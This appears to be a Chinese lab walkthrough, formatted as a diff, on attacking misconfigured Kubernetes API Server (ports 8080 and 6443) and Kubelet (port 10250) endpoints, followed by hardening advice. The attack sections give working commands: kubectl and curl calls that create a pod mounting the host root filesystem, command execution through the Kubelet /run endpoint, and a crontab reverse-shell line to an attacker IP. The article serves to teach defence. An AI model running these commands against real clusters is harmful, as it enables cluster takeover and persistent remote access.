@@ -1,0 +1,295 @@
+引言
+
+随着企业数字化转型的深入，容器化和云原生架构已成为主流。Kubernetes（简称K8s）作为容器编排的事实标准，被广泛应用于公有云、私有云和混合云环境中。然而，云原生技术的普及也带来了新的安全挑战——传统基于主机的安全边界逐渐模糊，攻击者的目光开始投向Kubernetes集群本身。在近年来的攻防演练中，针对K8s的入侵路径层出不穷：从容器逃逸到控制宿主机，从未授权访问API Server到横向移动至整个集群。本文将从Kubernetes的核心架构出发，结合微软发布的Kubernetes威胁矩阵，深入剖析API Server和Kubelet组件的未授权访问漏洞，并通过实际环境复现攻击过程，最后给出相应的加固建议，帮助安全从业者更好地理解和防护云原生环境。
+
+一、Kubernetes集群架构概览
+
+Kubernetes是一个开源的容器编排平台，旨在自动化容器的部署、扩展和管理。一个典型的K8s集群由控制平面（Master）和工作节点（Node）组成，其核心组件分工明确，共同维护集群的期望状态。
+
+1. 控制平面组件
+
+· etcd：保存整个集群的状态数据，是K8s的数据库，需重点保护。
+· API Server（kube-apiserver）：所有资源操作的唯一入口，提供认证、授权、访问控制及API注册发现等功能。它暴露了RESTful API，供用户、管理员和其他组件调用。
+· Controller Manager（kube-controller-manager）：负责维护集群状态，如故障检测、自动扩展、滚动更新等。
+· Scheduler（kube-scheduler）：负责将Pod调度到合适的节点上。
+
+2. 节点组件
+
+· Kubelet：运行在每个节点上的代理，负责维护Pod的生命周期，并管理容器运行时和存储卷。
+· Container Runtime：容器运行时环境，如Docker、containerd，负责拉取镜像和运行容器。
+· Kube-proxy：实现Service的负载均衡和服务发现，维护网络规则。
+
+3. 工作负载
+
+· Pod：K8s中最小的部署单元，包含一个或多个共享网络的容器。
+
+理解这些组件的功能及其通信方式，是发现和利用安全漏洞的前提。攻击者通常会寻找配置不当的组件，尤其是那些暴露了未授权API的组件。
+
+二、Kubernetes攻击面概览
+
+在云原生环境中，传统的渗透路径（外网突破→提权→横向移动）依然有效，但攻击者有了新的入侵路径：
+
+· 通过容器逃逸获取宿主机权限，进而攻击Kubelet或控制平面。
+· 直接攻击暴露的API Server或Kubelet端口，获得集群控制权。
+· 利用K8s组件间的信任关系，从被攻陷的Pod横向移动到其他节点或敏感服务。
+
+微软发布的Kubernetes威胁矩阵详细列出了攻击者可能利用的战术和技术，其中未授权访问是初始访问阶段的高风险项。本文聚焦于两个最常见且危害巨大的未授权访问场景：
+
+1. API Server 8080端口（非安全端口）
+2. API Server 6443端口（匿名用户绑定高权限）
+3. Kubelet 10250端口（只读或读写API未授权）
+
+接下来，我们将通过实际环境复现这些攻击，并分析其原理。
+
+三、环境搭建
+
+为了复现攻击，我们准备了三台CentOS 7虚拟机，分别作为Master和两个Node节点。集群搭建参考了网络上的教程（详见文末链接），关键步骤如下：
+
+· 节点信息：
+  · Master: 192.168.139.130
+  · Node1: 192.168.139.131
+  · Node2: 192.168.139.132
+· 使用kubeadm部署Kubernetes集群，版本选择v1.20（低于v1.20的版本默认开启8080端口，便于演示）。
+· 在Master节点上修改API Server的清单文件/etc/kubernetes/manifests/kube-apiserver.yaml，添加--insecure-port=8080和--insecure-bind-address=0.0.0.0，以开启非安全端口（仅用于测试，生产环境严禁开启）。
+· 在Node节点上修改Kubelet配置/var/lib/kubelet/config.yaml，将authentication.anonymous.enabled设为true，authorization.mode设为AlwaysAllow，然后重启kubelet服务。
+
+四、API Server未授权访问实战
+
+API Server是集群的入口，控制所有资源的增删改查。如果攻击者能绕过认证或直接访问未授权的API，就意味着获得了集群的完全控制权。
+
+1. 攻击8080端口（非安全端口）
+
+背景：在Kubernetes v1.16之前，API Server默认会监听两个端口：6443（安全端口，需TLS认证）和8080（非安全端口，无需认证）。新版本已默认关闭8080端口，但管理员可能因测试或兼容性原因手动开启。
+
+利用条件：
+
+· Kubernetes版本低于v1.20（或虽高版本但手动开启）。
+· 8080端口可从攻击者网络访问（绑定在0.0.0.0且防火墙未限制）。
+
+攻击步骤：
+
+首先，探测Master的8080端口是否开放：
+
+```bash
+nc -zv 192.168.139.130 8080
+```
+
+若端口开放，使用kubectl直接连接：
+
+```bash
+# 获取节点列表
+kubectl -s 192.168.139.130:8080 get nodes
+
+# 获取所有Pod
+kubectl -s 192.168.139.130:8080 get pods --all-namespaces
+```
+
+攻击者可以像管理员一样执行任何操作，例如创建一个挂载了宿主机根目录的恶意Pod，从而实现容器逃逸：
+
+创建一个YAML文件test.yaml：
+
+```yaml
+apiVersion: v1
+kind: Pod
+metadata:
+  name: test
+  namespace: default
+spec:
+  containers:
+  - name: test
+    image: nginx:1.14.2
+    volumeMounts:
+    - mountPath: /host
+      name: host
+  volumes:
+  - name: host
+    hostPath:
+      path: /
+      type: Directory
+```
+
+使用kubectl创建：
+
+```bash
+kubectl -s 192.168.139.130:8080 create -f test.yaml
+```
+
+进入容器：
+
+```bash
+kubectl -s 192.168.139.130:8080 --namespace=default exec -it test bash
+```
+
+在容器内，可以看到宿主机的根目录被挂载到/host，攻击者可以写入计划任务或SSH密钥等方式控制宿主机：
+
+```bash
+echo -e "* * * * * root bash -i >& /dev/tcp/192.168.139.128/4444 0>&1\n" >> /host/etc/crontab
+```
+
+2. 攻击6443端口（匿名用户高权限绑定）
+
+背景：6443端口是API Server的安全端口，默认要求客户端提供有效证书或令牌进行身份认证。但是，如果管理员错误地将system:anonymous用户绑定到cluster-admin集群角色，则任何未认证的匿名用户都可以通过6443端口以管理员权限访问API。
+
+利用条件：
+
+· 执行了以下高危命令：
+  ```bash
+  kubectl create clusterrolebinding system:anonymous --clusterrole=cluster-admin --user=system:anonymous
+  ```
+· 6443端口可从攻击者网络访问。
+
+攻击步骤：
+
+首先，尝试匿名访问API Server的版本信息：
+
+```bash
+curl -k https://192.168.139.130:6443/version
+```
+
+如果返回正常的版本信息，说明匿名用户已被允许访问API（至少只读）。
+
+进一步，尝试创建Pod。由于没有kubectl配置文件，我们可以直接使用curl调用API。以下请求创建一个与上述test.yaml类似的Pod（注意请求体需为JSON格式）：
+
+```bash
+curl -k -X POST https://192.168.139.130:6443/api/v1/namespaces/default/pods \
+-H "Content-Type: application/json" \
+-d '{
+  "apiVersion": "v1",
+  "kind": "Pod",
+  "metadata": {
+    "name": "test02",
+    "namespace": "default"
+  },
+  "spec": {
+    "containers": [
+      {
+        "name": "test02",
+        "image": "nginx:1.14.2",
+        "volumeMounts": [
+          {
+            "mountPath": "/host",
+            "name": "host"
+          }
+        ]
+      }
+    ],
+    "volumes": [
+      {
+        "name": "host",
+        "hostPath": {
+          "path": "/",
+          "type": "Directory"
+        }
+      }
+    ]
+  }
+}'
+```
+
+创建成功后，可以通过kubectl（跳过TLS验证）查看Pod：
+
+```bash
+kubectl --insecure-skip-tls-verify -s https://192.168.139.130:6443 get pods
+```
+
+进入容器执行命令：
+
+```bash
+kubectl --insecure-skip-tls-verify -s https://192.168.139.130:6443 --namespace=default exec -it test02 -- bash
+```
+
+后续的权限维持和横向移动与8080端口攻击类似。
+
+五、Kubelet未授权访问实战
+
+Kubelet是每个节点上的代理，负责管理Pod和容器。它默认监听10250端口，提供HTTPS API，用于kubelet与API Server通信，也允许kubectl执行exec等命令。如果Kubelet配置不当，攻击者可以直接调用其API获取节点信息或在容器内执行命令。
+
+利用条件：
+
+· Kubelet的/var/lib/kubelet/config.yaml中，将authentication.anonymous.enabled设为true，且authorization.mode设为AlwaysAllow。
+· 10250端口可从攻击者网络访问。
+
+攻击步骤：
+
+首先，访问Kubelet的只读端点（/pods），获取节点上所有Pod的信息：
+
+```bash
+curl -k https://192.168.139.132:10250/pods
+```
+
+（返回JSON格式的Pod列表，包含命名空间、Pod名称和容器名称。）
+
+接下来，利用Kubelet的/run端点（需要读写权限）在容器内执行命令。构造请求的URL格式为：
+
+```
+https://<node-ip>:10250/run/<namespace>/<pod>/<container>
+```
+
+例如，在之前创建的test02 Pod中执行id命令：
+
+```bash
+curl -XPOST -k "https://192.168.139.132:10250/run/default/test02/test02" -d "cmd=id"
+```
+
+如果Kubelet允许匿名访问且授权模式为AlwaysAllow，将返回命令执行结果。
+
+注意：/run端点允许在容器内执行任意命令，等同于kubectl exec。攻击者可以借此收集信息、下载恶意软件或进行内网扫描。
+
+此外，Kubelet的另一个端点/runningpods/（或/pods）也可以获取Pod信息，但命令执行更危险。
+
+六、攻击原理分析
+
+API Server 8080端口
+
+非安全端口的设计初衷是方便开发和调试，因为它直接绕过认证和授权。任何能够访问该端口的人都可以直接调用所有API，如同管理员。该端口在v1.20后默认关闭，但仍有许多旧版本或配置不当的集群暴露该风险。
+
+API Server 6443端口匿名绑定
+
+Kubernetes默认的RBAC设置中，匿名用户（system:anonymous）只有有限的权限（通常只能访问/healthz等只读端点）。但当管理员将匿名用户绑定到cluster-admin角色时，任何未认证的请求都被赋予管理员权限。这是一种典型的错误配置，往往是由于为了方便测试或误解权限模型所致。
+
+Kubelet 10250端口
+
+Kubelet API设计用于集群内部组件通信，默认需要认证（基于TLS客户端证书）。如果开启匿名访问并将授权模式改为AlwaysAllow，则攻击者可以直接通过Kubelet控制节点上的所有容器。Kubelet API的强大功能包括获取Pod信息、在容器内执行命令、甚至获取节点上的容器日志等，一旦被滥用，整个节点上的工作负载都将沦陷。
+
+七、防御措施
+
+针对上述攻击，建议采取以下加固措施：
+
+1. API Server加固
+
+· 关闭非安全端口：确保--insecure-port和--insecure-bind-address参数未被设置。对于v1.20及以上版本，该端口默认关闭。
+· 强化认证与授权：使用TLS证书、令牌或OIDC进行严格的身份认证，并基于最小权限原则配置RBAC。切勿将匿名用户绑定到高权限角色。
+· 网络策略：通过防火墙或安全组限制对6443端口的访问，只允许受信任的IP（如运维堡垒机）连接。
+· 审计日志：启用API Server的审计日志，记录所有请求，以便事后追溯。
+
+2. Kubelet加固
+
+· 关闭匿名访问：设置authentication.anonymous.enabled为false，并要求客户端提供有效证书。
+· 设置授权模式：将authorization.mode设为Webhook，由API Server集中授权，避免设为AlwaysAllow。
+· 限制Kubelet API访问：通过防火墙只允许API Server访问Kubelet的10250端口，禁止外部直接访问。
+· 节点安全：定期更新Kubernetes版本，修复已知漏洞；对节点进行安全基线检查。
+
+3. 通用措施
+
+· 镜像安全：避免使用恶意或漏洞镜像，实施镜像扫描。
+· Pod安全策略：使用Pod Security Admission或第三方工具限制Pod的权限，如禁止挂载宿主机敏感路径。
+· 运行时安全：部署容器安全监控工具，检测异常行为。
+
+八、总结与展望
+
+本文从Kubernetes架构出发，详细分析了API Server和Kubelet组件的未授权访问风险，并通过实际环境复现了攻击过程。这些漏洞的根源在于配置不当：非安全端口的开启、匿名用户的过度授权、Kubelet匿名访问的允许。在云原生安全日益重要的今天，安全从业者不仅需要熟悉传统攻防，更要深入理解云平台组件的运行机制和风险点。
+
+未来，随着云原生技术的演进，攻击面也会不断变化。只有将安全左移，在部署阶段就遵循最小权限原则，并持续监控运行时状态，才能有效应对层出不穷的云上攻击。希望本文能为读者在云原生安全领域的探索提供一些实用的参考。
+
+---
+
+参考资料：
+
+· Kubernetes官方文档：https://kubernetes.io/docs/home/
+· 云原生攻击矩阵：微软Kubernetes威胁矩阵
+· 环境搭建参考：https://www.jianshu.com/p/25c01cae990c
+· API Server配置：https://blog.csdn.net/fly910905/article/details/120887686
+· 攻击细节参考：https://mp.weixin.qq.com/s/yQoqozJgP8F-ad24xgzIPw
+· 更多攻防技术：https://mp.weixin.qq.com/s/QEuQa0KVwykrMzOPdgEHMQ
+
+（注：本文所有攻击实验均在授权环境下进行，请勿用于非法用途。）
